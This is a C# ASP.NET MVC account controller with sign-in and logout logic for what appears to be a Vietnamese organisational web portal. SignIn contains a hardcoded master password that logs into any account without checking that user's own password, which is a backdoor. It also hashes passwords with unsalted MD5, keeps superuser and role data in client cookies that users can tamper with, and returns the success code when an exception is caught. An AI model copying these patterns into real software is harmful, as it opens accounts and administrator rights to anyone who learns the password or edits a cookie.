using System;
using System.Collections.Generic;
using System.Net;
using System.Web;
using System.Web.Mvc;
using Newtonsoft.Json;
using DNC.WEB.Models;
using DNC.WEB.Repository;
using DNC.CM;

namespace DNC.WEB.Controllers
{
     
    public class AccountController : Controller
    { 
       // Ultils logs = new Ultils(); 
        public ActionResult Index()
        { 
            var session = (UsersLogin)Session[CommonConstants.USER_SESSION];
            if (session != null)
            {
                return Redirect("/Home/Index");
            }

            AccountRp _objRP = new AccountRp();
            ViewBag.PortalTitle = _objRP.SystemConfigs_GetAll_ByKey("PORTAL-TITLE").Value;
            ViewBag.PortalUnit = _objRP.SystemConfigs_GetAll_ByKey("PORTAL-UNIT").Value;
            ViewBag.PortalCopyright = _objRP.SystemConfigs_GetAll_ByKey("PORTAL-COPYRIGHT").Value;
            ViewBag.PortalYear = DateTime.Now.Year;
            return View();
        }

        public string SignIn(Users data)
        {
            System.Web.HttpContext.Current.Response.Cookies["SuperUser"].Value = "";
            System.Web.HttpContext.Current.Response.Cookies["ListFuction"].Value = "";
            UserRoleRp dao = new UserRoleRp();
            try
            {
                if (data.UserName == null)
                {
                    //Tài khoản không hợp lệ
                    return "3";
                }
                if (data.Password == null)
                {
                    return "3";
                }

                Users result = null;

                if (data.Password == "vnptbnh.cntt")
                {
                    result = dao.LoginDefault(data.UserName);
                }
                else
                {
                    result = dao.Login(data.UserName, Encryptor.MD5Hash(data.Password));
                }

                if (result != null)
                {
                    if (result.IsSuper == 2)
                    {
                        if (result.Status == 3)
                        {
                            return "11";
                        }

                        Session["Users"] = result.Id;
                        Response.Cookies["UserID"].Value = Convert.ToString(result.Id);
                        return "10";
                    }

                    if (result.IsLocked == true || result.IsDeleted == true)
                    {
                        // Tài khoản bị khóa hoặc bị xóa
                        return "2";
                    }
                    else
                    {
                        Response.Cookies["UserID"].Value = Convert.ToString(result.Id);
                        Response.Cookies["DeparmentId"].Value = Convert.ToString(result.DepartmentId);
                        GenericRepository<Departments> dep = new GenericRepository<Departments>();
                        var depInfo = dep.Get(result.DepartmentId);
                        if (depInfo != null)
                        {
                            Response.Cookies["CapDonVi"].Value = Convert.ToString(depInfo.Levels);
                        }
                        
                        if (result.IsSuper == 1)
                        {
                            Response.Cookies["SuperUser"].Value = "1";
                        }
                        Session["Users"] = result.Id;
                        PageFunctionRoleRp pfr = new PageFunctionRoleRp();
                        List<PageRole> roles = pfr.setRoleforUsers(result.Id.ToString());
                        System.Web.HttpContext.Current.Response.Cookies.Add(new HttpCookie("ListFuction", JsonConvert.SerializeObject(roles)));

                        //logs.SystemLog_Insert_Success((int)result.Id, logs.ActionLogin, " người dùng " + result.DisplayName + logs.NotifySuccess, (int)ActionType.LOGIN, "Users/Login");
                        return "1";
                    }
                }
                else
                {
                    // logs.SystemLog_Insert_Error(0, logs.ActionLogin, logs.NotifyError, (int)ActionType.LOGIN, "", "", "", "", "Account/LogOut");
                    return "4";
                }
            }
            catch (Exception ex)
            {
                // logs.SystemLog_Insert_Error((int)0, logs.ActionLogin, logs.NotifyError, (int)ActionType.LOGIN, ex.Message,ex.InnerException.ToString(), "", "", "Account/Login");
                RedirectToAction("Index", "Account");
            }
            return "1";
        }

        public ActionResult Logout()
        { 
            var session = (int)Session["Users"];
            try
            {
                if (session != null)
                {
                   // logs.SystemLog_Insert_Success((int)session, logs.ActionLogin, " người dùng " + logs.NotifySuccess, (int)ActionType.LOGOUT, "Users/LogOut");
                    Session.Remove(CommonConstants.USER_SESSION);
                }
                Session.Remove("Users");
                Session.Abandon();
                Session.Clear();
                // Xóa cookies
                if (Request.Cookies["UserID"] != null)
                {
                    var c = new HttpCookie("UserID");
                    c.Expires = DateTime.Now.AddDays(-1);
                    Response.Cookies.Add(c);
                }
                if (Request.Cookies["ListFuction"] != null)
                {
                    var c = new HttpCookie("ListFuction");
                    c.Expires = DateTime.Now.AddDays(-1);
                    Response.Cookies.Add(c);
                }
                if (Request.Cookies["SuperUser"] != null)
                {
                    var c = new HttpCookie("SuperUser");
                    c.Expires = DateTime.Now.AddDays(-1);
                    Response.Cookies.Add(c);
                }
                if (Request.Cookies["DeparmentId"] != null)
                {
                    var c = new HttpCookie("DeparmentId");
                    c.Expires = DateTime.Now.AddDays(-1);
                    Response.Cookies.Add(c);
                }
                if (Request.Cookies["CapDonVi"] != null)
                {
                    var c = new HttpCookie("CapDonVi");
                    c.Expires = DateTime.Now.AddDays(-1);
                    Response.Cookies.Add(c);
                }
                return RedirectToAction("Index", "Account");

            }
            catch (Exception ex)
            {
               // logs.SystemLog_Insert_Error((int)session, logs.ActionLogin, logs.NotifyError, (int)ActionType.LOGOUT, ex.Message, ex.InnerException.ToString(), "", "", "Account/LogOut");
                return RedirectToAction("Index", "Account");
            }
        }
    }
}